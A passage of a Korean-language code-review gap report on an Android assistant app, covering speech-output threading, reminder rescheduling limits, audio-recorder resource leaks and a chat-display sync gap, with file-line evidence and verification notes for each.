  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:54-61, 199-203 — tts·focusRequest·selectedLangCode 는 잠금 없는 일반 필드인데 finish() 는 엔진 콜백 스레드에서, speak()/release() 는 메인에서 건드린다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:168-178 — onInit 이 '그 콜백을 낸 엔진'이 아니라 현재 tts 필드를 쓴다(엔진을 바꾼 직후 옛 엔진의 콜백이 새 엔진의 준비 완료로 처리될 수 있음)
- 검증: 직접 확인: SpeechOutput.kt:159-161 onError 두 종류가 어느 조각이든 finish() 만 부르고 엔진은 멈추지 않는다. 109-113 stop() 은 speakingMessageId 가 null 이면 바로 돌아간다 — 그래서 조각 오류 뒤에는 ChatViewModel.kt:659(녹음 시작 전 stop)·727 이 아무 일도 하지 않는다. 89-91 은 engine.speak 반환값을 버린다. 54-61 의 tts·focusRequest·selectedLangCode 는 잠금 없는 필드이고 finish(199-203)는 엔진 콜백 스레드에서 불린다(lastUtteranceId 만 @Volatile). 168-178 onInit 은 콜백을 낸 엔진이 아니라 현재 tts 필드를 쓴다. 모두 코드로는 맞다. 다만 '조각 하나가 오류 나도 남은 큐가 계속 읽힌다'는 것은 안드로이드 엔진의 일반 동작에 기대는 추정이고 이 저장소 테스트·실기기 기록으로 본 적은 없다 — 재현은 엔진 의존. 앱을 내리면 release(122-128)의 shutdown 이 어쨌든 멈춘다. 수정은 몇 줄(오류 때 엔진 stop, stop 은 상태와 무관하게 엔진 stop, speak 실패 처리)이라 값 대비 부담이 작다. 스레드 정리(④)는 필요성이 가장 약하다.
- 앞선 기록: CHANGELOG 0.29.0 M1·M4, docs/checklists/device_gate.md:46 ④(정상 경로만). 오류 경로 기록 없음

### gap-briefingvoice-8 · 알림 시간 바꾸기가 날짜를 못 넘긴다 — 밤에 '내일 새벽'으로 옮기려 하면 '이미 지난 시각'으로 막힌다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 이미 울린 알림을 '내일 아침 7시에 다시'로 옮기거나, 밤 11시 알림을 0시 30분으로 미루는 것이 시트에서는 불가능하다. 사용자는 오류 문구만 보고 왜 안 되는지 알기 어렵고, 결국 채팅으로 새로 부탁해야 한다(모델 추론 한 턴). 채팅 쪽 일정에는 0.42.5 에서 '지난 시각이면 내일인지 묻는' 흐름을 넣었는데 카드 편집에는 대응이 없다.
- 제안: reschedule 에서 고른 시각이 오늘 기준 이미 지났으면 자동으로 다음 날로 넘기고(원래 날짜가 미래인 알림은 그대로), 결과 줄과 카드의 날짜 표기('내일 오전 7:00')로 사용자가 바로 알게 한다. 조용한 날짜 변경이 꺼려지면 오류 문구를 '오늘은 이미 지난 시각이에요. 내일 같은 시각으로 바꿀까요?' + 버튼 하나로. 어느 쪽인지는 사용자 결정 사항이다. 지금 테스트가 '지난 시각이면 ValidationError'를 고정하고 있다면 단언 변경은 먼저 보여 주고 확인받는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:66-77 — 날짜는 '원래 날짜(지났으면 오늘)'로 고정하고 시·분만 바꾼 뒤, 지금보다 과거면 오류
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditSheet.kt:124-147 — 시트에는 시각 고르기만 있고 날짜를 고를 방법이 없다
- 검증: 직접 확인: ReminderEditor.kt:66-77 은 날짜를 '원래 날짜(지났으면 오늘)'로 고정하고 고른 시·분이 지금 이전이면 ValidationError('이미 지난 시각이에요.')를 돌린다. ReminderEditSheet.kt:124-147 에는 시각 고르기(TimePicker)만 있고 날짜 고르기는 없다(grep 으로 DatePicker 없음 확인). 따라서 밤에 다음 날 새벽·아침으로 옮길 수 없다는 주장은 맞다. 결함이 아니라 0.38.2 에서 그렇게 만든 기록된 동작의 빈틈이므로 '자동으로 내일로 넘김' 대 '물어보는 버튼' 선택은 사용자 결정이다. 기존 단언 ReminderEditorTest.kt:87-94('지난 시각은 거부하고 아무것도 바꾸지 않는다')가 지금 동작을 고정하고 있어 바꾸려면 대상을 먼저 보여 주고 확인받아야 한다(AGENTS §2-②).
- 앞선 기록: docs/plans/0.38.2-chat-redesign.md:49 — M4 결과로 '시간 바꾸기 = 원래 날짜(지났으면 오늘)·지난 시각 거부'가 설계로 기록됨. CHANGELOG 0.42.5 M1 은 채팅 일정의 지난 시각 되묻기만. 날짜 넘김을 검토·기각한 기록은 없음

### gap-briefingvoice-9 · 녹음기 내부의 해제 누락과 방어 빈틈(초기화 실패, 시작·정지 겹침, 읽기 오류 시 헛돌기)
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 각각은 드물지만(다른 앱이 마이크를 쥐고 있어 초기화 실패, 위젯·빠른 설정 타일·버튼이 거의 동시에 녹음을 시작, 오디오 서버 재시작) 한 번 겹치면 마이크가 열린 채 남거나 화면은 '녹음 중'인데 실제로는 아무것도 녹음되지 않는다. 진입 통로가 세 곳(입력바·위젯·타일)이라 겹칠 여지가 있다. '초기화 실패 시 해제'는 코드 리뷰에서 가장 먼저 지적받는 종류다.
- 제안: startRecording 을 try/finally 구조로 바꿔 성공하지 못한 AudioRecord 는 그 자리에서 release 하고 필드를 null 로 되돌린다. 녹음기 상태를 Mutex(또는 상태 열거형 Idle/Recording/Stopping)로 묶어 Idle 이 아닐 때의 start 는 Failure 를 돌린다. 쓰기 루프에서 read < 0 이면 로그를 남기고 루프를 끝낸다(isRecording=false). ChatViewModel 은 정지가 끝난 뒤에 isRecording 을 내리거나 'stopping' 동안 마이크 버튼을 잠근다. 1번 항목(취소 진입점)과 한 회차로 묶으면 좋다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:82-92 — AudioRecord 를 만든 뒤 초기화 실패면 release 없이 Failure 를 돌린다(필드에도 그대로 남음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:94, 102-105 — startRecording() 이 던지는 경우도 catch 에서 release 하지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:66-101 — 이미 녹음 중이거나 정지가 진행 중인지 보지 않고 audioRecord·outputFile 을 덮어쓴다. 파일 이름도 하나로 고정(72줄)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:108-121 — 정지는 쓰기 코루틴을 기다리는 동안 중단되는데, 그 사이 새 시작이 들어오면 정지가 새 녹음기를 닫고 옛 녹음기는 영영 안 닫힌다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:184-198 — read 가 음수(오류)를 돌려도 상태가 RECORDING 이면 쉬지 않고 다시 읽어 한 스레드가 정지까지(최대 30초) 헛돈다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:676-690 — 화면은 isRecording 을 먼저 false 로 내리고 정지는 비동기로 돌려, 그 사이 마이크를 다시 누르면 위 겹침 경로가 열린다
- 검증: 맞는 부분(직접 확인): AudioRecorder.kt:82-92 는 초기화 실패 시 release 없이 돌아가고 필드에 남는다(다음 시작이 덮어써 가비지 수거 때까지 방치). 94·102-105 에서 startRecording 예외도 release 하지 않는다. 66-101 에 재진입 검사가 없고 파일 이름은 하나(72). 184-197 은 read 가 음수여도 상태가 RECORDING 이면 쉬지 않고 돈다. ChatViewModel.kt:681-683 은 isRecording 을 먼저 내리고 정지를 비동기로 돌려, 그 짧은 사이 다시 시작하면 108-121 의 정지가 새 녹음기를 닫고 옛 것을 놓칠 수 있다. 더 나아가 쓰기 루프(184)는 중단점이 없는 차단 루프라 취소로는 안 끝나고 isRecording 플래그에만 의존하므로, 그 사이 새 시작이 플래그를 다시 올리면 정지 대기(113)가 길어질 수 있다. 틀리거나 과장된 부분: '진입 통로가 세 곳이라 거의 동시에 시작이 겹친다' — 입력바·위젯·타일 모두 ChatScreen.kt:272·280 에서 ChatViewModel.toggleRecording 하나로 모이고 메인 스레드의 isRecording 상태로 걸러지므로(ChatViewModel.kt:655) 서로 다른 통로끼리의 동시 시작은 성립하지 않는다. 남는 것은 정지 직후 수십~백 밀리초 안에 다시 누르는 경우와 초기화 실패·읽기 오류뿐이라 드물다. 1번(취소 진입점)과 같은 회차에 묶어 상태 하나로 정리하는 것이 맞다.
- 앞선 기록: CHANGELOG 초기 회차(docs/CHANGELOG.md:1214 녹음 30초 상한), AudioRecorder.kt:110-111 주석(정지 순서). 시작 실패 해제·겹침에 대한 기록 없음

### gap-briefingvoice-10 · 일정 화면에서 알림을 고치면 대화에 한 줄이 저장되지만 채팅 화면에는 나타나지 않는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 일정 화면에서 알림을 10분 미루고 채팅으로 돌아오면 화면에는 아무 흔적이 없는데, 모델은 다음 턴에 그 한 줄을 대화 기록으로 읽고 답한다(보이는 대화와 모델이 아는 대화가 다름). 앱을 다시 열면 그 줄이 대화 중간에 뒤늦게 끼어 나타난다. 시트 각주('바꾸면 대화에도 한 줄 남아서 비서가 바뀐 시각을 알아요')와도 어긋난다.
- 제안: 브리핑과 같은 방식으로 맞춘다 — ReminderEditor(또는 작은 @Singleton 신호 객체)가 저장 완료를 SharedFlow 로 내고 ChatViewModel 이 받아 그 메시지를 붙이거나 꼬리를 다시 읽는다. 단 꼬리 다시 읽기(loadMessages)는 메시지 목록을 통째로 갈아 끼우므로 답을 생성 중일 때는 미뤄야 한다(isInFlight 면 턴이 끝난 뒤). 채팅 시트 경로의 appendLocalMessage 와 중복으로 붙지 않게 메시지 id 로 걸러 낸다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:111-123 — 어디서 부르든 지금 세션에 비서 한 줄을 DB 로 저장하고 엔진 대화를 다시 만들게 표시한다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/CalendarViewModel.kt:147-157 — 일정 화면 경로는 성공 시 시트를 닫고 목록만 다시 읽는다(채팅에 알릴 통로 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/navigation/AppNavHost.kt:146 — 채팅 경로만 onSaved = chatViewModel::appendLocalMessage 로 화면에 붙인다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:128-131 — 채팅으로 돌아올 때는 요약 타일만 다시 세고 메시지는 다시 읽지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:291-295 — 브리핑은 같은 문제를 저장 신호(briefingSaved)로 풀어 두었다
- 검증: 직접 확인: ReminderEditor.kt:111-123 은 호출처와 무관하게 활성 세션에 비서 한 줄을 저장하고 invalidateConversation 을 부른다. CalendarViewModel.kt:147-157 은 성공 시 closeReminder·loadTasks 만 한다. 채팅 쪽만 AppNavHost.kt:146 에서 onSaved = chatViewModel::appendLocalMessage 로 화면에 붙인다(ChatViewModel.kt:701-703, 주석도 'DB 에만 쓰면 다시 열 때까지 화면에 안 나온다'). ChatScreen.kt:126-131 은 돌아올 때 요약 타일만 다시 세고, ChatViewModel 의 loadMessages 호출은 초기화(200)·브리핑 신호(293)·음성 턴(539)뿐이라 일정 화면에서 고친 줄은 다시 읽히지 않는다. 시트 각주 strings.xml:182 '바꾸면 대화에도 한 줄 남아서…'는 일정 화면 시트에도 같이 쓰인다(CalendarScreen.kt:329 가 같은 ReminderEditSheet). 결과적으로 보이는 대화와 모델이 읽는 대화가 한 줄 어긋난다 — 주장대로다. 영향은 한 줄이고 다시 열면 보이므로 낮음. 고칠 때 loadMessages 는 목록을 통째로 갈아 끼우니 답 생성 중에는 미루라는 제안의 주의점도 타당하다.
- 앞선 기록: docs/plans/0.38.2-chat-redesign.md:34·51(D8 — 한 줄 저장 + 다음 턴 엔진 대화 재구성, 사용자 결정 2026-10-19), CHANGELOG 0.38.3 M1(일정 화면이 같은 수정 시트 사용). 일정 화면에서 고친 줄을 채팅 화면에 반영하는 기록은 없음

<details><summary>읽은 범위</summary>

[읽은 것 — 전부 직접 읽음] 저장소 루트 C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday 기준: app/.../assistant/briefing/MorningBriefingGenerator.kt, domain/.../usecase/GenerateBriefingUseCase.kt, domain/.../cleanup/GenerateWeeklyReviewUseCase.kt, app/.../work/BriefingNotificationScheduler.kt·BriefingNotificationWorker.kt, app/.../platform/notification/BriefingNotifier.kt, app/.../feature/chat/BriefingCard.kt, app/.../assistant/startup/StartupCoordinator.kt, app/.../feature/profile/ProfileSheet.kt·ProfileSheetViewModel.kt·ProfileSuggestionResolver.kt, app/.../assistant/context/ProfileBlock.kt, data 의 ProfileRepositoryImpl·ProfileSuggestionRepositoryImpl·두 DAO, app/.../platform/speech/AudioRecorder.kt·SpeechOutput.kt·SpeakableText.kt, domain/.../usecase/TranscribeAudioUseCase.kt, app/.../feature/chat/result/ReminderEditor.kt·ReminderEditSheet.kt·ChatExtrasViewModel.kt, OneShotLimits.kt(BrokenOutput).
[일부만 읽음] ResultCard.kt(1~140줄 — 알림·일정 매핑까지, 메모·기억·문서 출처 매핑은 안 봄), ChatViewModel.kt(녹음·낭독·브리핑 구독·제안 처리 구간), GemmaModelRunner.kt(음성 추론 진입·대화 무효화 구간), EpisodeFactExtractor.kt·ExtractFactsUseCase.kt(프로필 제안 생성·파싱 구간), GetTodayScheduleUseCase.kt, TaskDao.kt, ReminderAlarmScheduler.kt(예약·취소), CalendarViewModel.kt(알림 수정 구간), KosmosApp.kt(백그라운드 전환 구간), ChatScreen.kt·ChatInputBar.kt(마이크 배선).
[못 본 것] runtime/multimodal 이라는 디렉터리는 저장소에 없었다(음성 입력은 GemmaModelRunner.generateWithAudio 가 맡음). 위젯·빠른 설정 타일의 녹음 진입(VoiceLaunchHandler), ReminderFireHandler·알람 리시버, 테스트 코드는 읽지 않았다. gradle·테스트·기기 실행은 하지 않았으므로 모든 항목은 코드 읽기 기준이다. 7·9번은 실제 엔진·기기 동작(오류 콜백 빈도, read 음수 반환 뒤 상태)에 달린 부분이 있어 confidence 를 medium 으로 두었다.
[확인했지만 문제 아님으로 본 것] 브리핑 같은 날 두 번 생성(뮤텍스 + DB 판정으로 막힘), 생성 중 앱 내림(저장 전 실패 → 다음 준비 때 재시도), 브리핑 중 사용자 입력(시작 단계 동안 입력바 잠김), 프로필 줄바꿈 주입(추출 파싱이 줄 단위·trim, 수동 입력은 한 줄 입력란), 거절한 제안 반복(같은 키·값은 상태와 무관하게 다시 묻지 않음), 수락 반영 시점(다음 턴 ContextBuilder 가 매번 읽음), 알림 수정 중 엔진 대화 무효화(플래그만 세움), 오디오 포커스 요청 누수(수신기 없는 요청은 같은 클라이언트 id 라 쌓이지 않음), 블루투스(특별 처리 없음 — 결함으로 볼 근거 없음).
[10건을 넘겨 뺀 것 4건] ① 주간 돌아보기가 요약된 지난 대화를 상한 없이 전부 읽은 뒤 7일치만 거르는 것(GenerateWeeklyReviewUseCase.kt:55 — 기록이 쌓이면 느려질 뿐 당장 영향 작음) ② 같은 파일 73~80줄: 가장 최근 한 줄이 예산을 넘으면 재료 0줄로 모델을 불러 지어낸 돌아보기가 저장될 수 있음(요약 길이상 일어나기 매우 어려워 뺌) ③ 제안 수락 시 프로필 읽기가 실패하면 빈 목록으로 보고 길이 상한 검사를 통과시키는 것(ProfileSuggestionResolver.kt:38 — DB 읽기 실패 자체가 드묾) ④ 결과 카드마다 DB 구독이 하나씩 생겨 긴 대화를 거슬러 올라가면 구독이 계속 늘어나는 것(ChatExtrasViewModel.kt:119-138 — 측정 없이 단정하기 어려워 뺌). 지시대로 이미 나온 항목(브리핑·받아쓰기 출력 상한, 브리핑 워커 재예약, 울린 알림 쌓임, 프로필 있는 상태의 회귀 세트)은 다시 내지 않았고, 2·3번은 그것들과 닿아 있지만 다른 결함(재료 선택, 내용 검사)이라 따로 냈다.

</details>
